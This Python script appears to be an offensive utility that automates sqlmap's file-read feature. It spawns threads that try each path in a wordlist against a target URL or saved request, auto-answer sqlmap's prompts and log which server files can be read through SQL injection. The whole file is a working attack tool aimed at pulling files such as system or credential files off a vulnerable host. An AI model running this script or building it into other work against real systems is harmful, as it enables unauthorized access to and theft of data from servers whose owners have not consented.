import pexpect
import func_timeout
import argparse
import queue
import threading
import logging
from io import StringIO

logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(name)s - %(levelname)s - %(message)s')
logger = logging.getLogger(__name__)


class GetArgs:
    def __init__(self):
        self.args = self.parse()

    def parse(self):
        parser = argparse.ArgumentParser(description='By zongdeiqianxing; Email: jshahjk@163.com')
        group = parser.add_mutually_exclusive_group()
        group.add_argument('-u', action="store", dest="url",)
        group.add_argument('-r', action="store", dest="headers_data", type=str, help='HTTP request header')
        parser.add_argument('-w', action="store", dest="file", type=str, help='wordlist containing file path')
        parser.add_argument('-t', action="store", required=False, type=int, dest="threads", default=1, help='threads count')
        # parser.add_argument('--download', action="store", required=False, type=str, dest="download", default='')
        args = parser.parse_args()
        return args


class SqlmapReader:
    def __init__(self):
        self.output = ""
        self.queue = queue.Queue()
        self.args = GetArgs().args

        if self.args.file:
            with open(self.args.file, 'r') as f:
                for line in f.readlines():
                    self.queue.put(line.strip())

        logger.info('The program has been started, if found readable files, it will be displayed, please wait..')

    def threads_run(self):
        try:
            for i in range(self.args.threads):
                t = threading.Thread(target=self.run)
                t.start()
        except func_timeout.exceptions.FunctionTimedOut:
            logger.error('The child thread runs out of time, automatically end the child thread')

    @func_timeout.func_set_timeout(200)
    def run(self):
        while not self.queue.empty():
            try:
                f1 = StringIO()
                file = self.queue.get()
                command = ''
                if self.args.url:
                    command = 'sqlmap -u {} -o --file-read={}'.format(self.args.url, file)
                if self.args.headers_data:
                    command = 'sqlmap -r {} -o --file-read={}'.format(self.args.headers_data, file)

                runner = pexpect.spawn(command, encoding='utf-8', logfile=f1, timeout=30)

                while True:
                    # print(f1.getvalue())
                    i = runner.expect(['[Y/n]', 'retrieved:\s\w+?', 'adjusting time delay to', 'have the same size', 'has been successfully downloaded'])
                    if i == 0:
                        runner.sendline('')
                    if i == 1:
                        logger.info('{} file exists'.format(file))
                        break
                    if i == 2:
                        logger.info('{} file exists'.format(file))
                        break
                    if i == 3:
                        logger.info('{} file exists'.format(file))
                        break
                    if i == 4:
                        logger.info('{} file exists'.format(file))
                        break
            except OSError:
                pass
            except pexpect.exceptions.EOF:
                pass
            except Exception as e:
                logger.error(e)


if __name__ == '__main__':
    SqlmapReader().threads_run()

